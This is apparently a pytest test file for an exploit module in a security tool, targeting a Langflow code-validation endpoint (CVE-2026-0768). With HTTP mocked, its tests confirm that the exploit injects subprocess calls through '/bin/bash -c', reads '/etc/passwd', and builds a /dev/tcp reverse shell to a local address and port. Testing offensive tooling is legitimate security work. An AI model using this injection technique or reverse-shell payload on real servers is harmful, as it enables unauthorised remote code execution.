"""Tests for flowhound.vulnerabilities.exploits.langflow.cve_2026_0768."""

from unittest.mock import MagicMock, patch

from flowhound.vulnerabilities.exploits.langflow.cve_2026_0768 import Exploit

_BASE_URL = "http://localhost:7860"


def _mock_resp(status: int = 200, json_data=None, text: str = "ok"):
    resp = MagicMock()
    resp.status_code = status
    resp.text = text
    if json_data is not None:
        resp.json.return_value = json_data
    return resp


# ---------------------------------------------------------------------------
# _blocking_boilerplate (static)
# ---------------------------------------------------------------------------


class TestBlockingBoilerplate:
    def test_indents_code(self):
        code = "x = 1\ny = 2"
        result = Exploit._blocking_boilerplate(code)
        assert "        x = 1" in result
        assert "        y = 2" in result

    def test_empty_code(self):
        result = Exploit._blocking_boilerplate("")
        assert "payload executed" in result

    def test_multiline_all_lines_indented(self):
        code = "a = 1\nb = 2\nc = 3"
        result = Exploit._blocking_boilerplate(code)
        lines = result.splitlines()
        indented = [
            l
            for l in lines
            if l.startswith(("        a = ", "        b = ", "        c = "))
        ]
        assert len(indented) == 3


# ---------------------------------------------------------------------------
# _build_injection (static)
# ---------------------------------------------------------------------------


class TestBuildInjection:
    def test_contains_command(self):
        result = Exploit._build_injection("id")
        assert "id" in result

    def test_contains_subprocess_run(self):
        result = Exploit._build_injection("id")
        assert "__import__('subprocess').run" in result

    def test_contains_exception_throw(self):
        result = Exploit._build_injection("id")
        assert "throw(Exception" in result

    def test_contains_stdout_stderr(self):
        result = Exploit._build_injection("id")
        assert "r.stdout" in result
        assert "r.stderr" in result

    def test_bash_wrapper_simple(self):
        result = Exploit._build_injection("id")
        # Single-word commands: wrapped in double-quoted outer string.
        assert '"/bin/bash -c id"' in result

    def test_bash_wrapper_quoted_multi_word(self):
        # Multi-word commands: shlex.quote adds single quotes inside double-quoted outer.
        result = Exploit._build_injection("cat /etc/passwd")
        assert "\"/bin/bash -c 'cat /etc/passwd'\"" in result

    def test_bash_wrapper_valid_python_syntax(self):
        import ast

        # The injection must always be syntactically valid Python regardless of command.
        for cmd in ["id", "cat /etc/passwd", "ls -la /tmp"]:
            ast.parse(Exploit._build_injection(cmd))  # raises SyntaxError if broken


# ---------------------------------------------------------------------------
# trigger_vuln
# ---------------------------------------------------------------------------


_AUTH_HEADER = {"Authorization": "Bearer test-token"}


class TestTriggerVuln:
    def test_sends_to_validate_code_endpoint(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0768.post",
            return_value=_mock_resp(422),
        ) as mock_post:
            exploit.trigger_vuln(base_url=_BASE_URL, auth=_AUTH_HEADER, cmd="id")
        assert mock_post.call_args.args[0] == _BASE_URL + "/api/v1/validate/code"

    def test_sends_auth_header(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0768.post",
            return_value=_mock_resp(422),
        ) as mock_post:
            exploit.trigger_vuln(base_url=_BASE_URL, auth=_AUTH_HEADER, cmd="id")
        assert mock_post.call_args.kwargs["headers"] == _AUTH_HEADER

    def test_injection_in_body(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0768.post",
            return_value=_mock_resp(422),
        ) as mock_post:
            exploit.trigger_vuln(base_url=_BASE_URL, auth=_AUTH_HEADER, cmd="whoami")
        body = mock_post.call_args.kwargs["json"]["code"]
        assert "whoami" in body
        assert "__import__('subprocess').run" in body

    def test_network_error_returns_none(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0768.post",
            side_effect=OSError("refused"),
        ):
            assert (
                exploit.trigger_vuln(base_url=_BASE_URL, auth=_AUTH_HEADER, cmd="id")
                is None
            )

    def test_passes_proxies(self):
        proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0768.post",
            return_value=_mock_resp(422),
        ) as mock_post:
            exploit.trigger_vuln(
                base_url=_BASE_URL, auth=_AUTH_HEADER, cmd="id", proxies=proxies
            )
        assert mock_post.call_args.kwargs["proxies"] == proxies


# ---------------------------------------------------------------------------
# exploit
# ---------------------------------------------------------------------------


class TestExploit:
    def test_returns_true_on_200(self):
        # HTTP 200 with output in function.errors[0] is the success condition.
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADER),
            patch(
                "flowhound.vulnerabilities.exploits.langflow.cve_2026_0768.post",
                return_value=_mock_resp(
                    200,
                    {
                        "imports": {"errors": []},
                        "function": {"errors": ["uid=0(root) gid=0(root)\n"]},
                    },
                ),
            ),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="root", password="root")
                is True
            )

    def test_extracts_output_from_function_errors(self):
        exploit = Exploit()
        logged = []
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADER),
            patch(
                "flowhound.vulnerabilities.exploits.langflow.cve_2026_0768.post",
                return_value=_mock_resp(
                    200,
                    {
                        "imports": {"errors": []},
                        "function": {"errors": ["uid=1000(user)\n"]},
                    },
                ),
            ),
            patch.object(
                exploit.logger, "info", side_effect=lambda msg: logged.append(msg)
            ),
        ):
            exploit.exploit(base_url=_BASE_URL, username="root", password="root")
        assert any("uid=1000(user)" in m for m in logged)

    def test_returns_false_when_auth_fails(self):
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=None),
            patch(
                "flowhound.vulnerabilities.exploits.langflow.cve_2026_0768.post"
            ) as mock_post,
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="root", password="root")
                is False
            )
        mock_post.assert_not_called()

    def test_returns_false_on_non_200(self):
        # Any non-200 means the request was rejected before reaching the vuln path.
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADER),
            patch(
                "flowhound.vulnerabilities.exploits.langflow.cve_2026_0768.post",
                return_value=_mock_resp(403, {"detail": "forbidden"}),
            ),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="root", password="root")
                is False
            )

    def test_returns_false_when_network_error(self):
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADER),
            patch(
                "flowhound.vulnerabilities.exploits.langflow.cve_2026_0768.post",
                side_effect=OSError("refused"),
            ),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="root", password="root")
                is False
            )

    def test_uses_default_cmd_when_no_payload(self):
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADER),
            patch(
                "flowhound.vulnerabilities.exploits.langflow.cve_2026_0768.post",
                return_value=_mock_resp(200, {"detail": {"error": "uid=0(root)"}}),
            ) as mock_post,
        ):
            exploit.exploit(base_url=_BASE_URL, username="root", password="root")
        body = mock_post.call_args.kwargs["json"]["code"]
        assert Exploit._DEFAULT_CMD in body

    def test_uses_payload_raw_command(self):
        payload = MagicMock()
        payload.raw_command = "whoami"
        payload.blocking = False
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADER),
            patch(
                "flowhound.vulnerabilities.exploits.langflow.cve_2026_0768.post",
                return_value=_mock_resp(200, {"detail": {"error": "root"}}),
            ) as mock_post,
        ):
            exploit.exploit(
                base_url=_BASE_URL,
                username="root",
                password="root",
                payload=payload,
            )
        body = mock_post.call_args.kwargs["json"]["code"]
        assert "whoami" in body

    def test_reverse_shell_payload_builds_bash_oneliner(self):
        payload = MagicMock()
        payload.blocking = True
        payload.raw_command = None
        payload.lhost = "192.168.1.5"
        payload.lport = 4444
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADER),
            patch(
                "flowhound.vulnerabilities.exploits.langflow.cve_2026_0768.post",
                side_effect=OSError("read timed out"),
            ) as mock_post,
        ):
            result = exploit.exploit(
                base_url=_BASE_URL,
                username="root",
                password="root",
                payload=payload,
            )
        assert result is True
        body = mock_post.call_args.kwargs["json"]["code"]
        assert "192.168.1.5" in body
        assert "4444" in body
        assert "/dev/tcp/" in body

    def test_reverse_shell_uses_short_read_timeout(self):
        payload = MagicMock()
        payload.blocking = True
        payload.raw_command = None
        payload.lhost = "192.168.1.5"
        payload.lport = 4444
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADER),
            patch(
                "flowhound.vulnerabilities.exploits.langflow.cve_2026_0768.post",
                side_effect=OSError("read timed out"),
            ) as mock_post,
        ):
            exploit.exploit(
                base_url=_BASE_URL,
                username="root",
                password="root",
                payload=payload,
            )
        timeout = mock_post.call_args.kwargs["timeout"]
        assert isinstance(timeout, tuple), (
            "blocking path must use (connect, read) tuple timeout"
        )
        assert timeout[1] <= 5

    def test_auth_header_forwarded_to_request(self):
        # Confirms the bearer token from authenticate() reaches the HTTP request.
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADER),
            patch(
                "flowhound.vulnerabilities.exploits.langflow.cve_2026_0768.post",
                return_value=_mock_resp(200, {"detail": {"error": "uid=0(root)"}}),
            ) as mock_post,
        ):
            exploit.exploit(base_url=_BASE_URL, username="root", password="root")
        assert mock_post.call_args.kwargs["headers"] == _AUTH_HEADER


# ---------------------------------------------------------------------------
# exploit — non-200/non-matching terminal path (line 153-154)
# ---------------------------------------------------------------------------


class TestExploitTerminalPath:
    def test_non_200_non_matching_returns_false(self):
        """A response that is neither 200 nor triggers the error-body match returns False."""
        exploit = Exploit()
        with (
            patch.object(
                exploit,
                "handle_authentication",
                return_value={"Authorization": "Bearer t"},
            ),
            patch.object(
                exploit,
                "trigger_vuln",
                return_value=_mock_resp(403),
            ),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="admin", password="secret")
                is False
            )
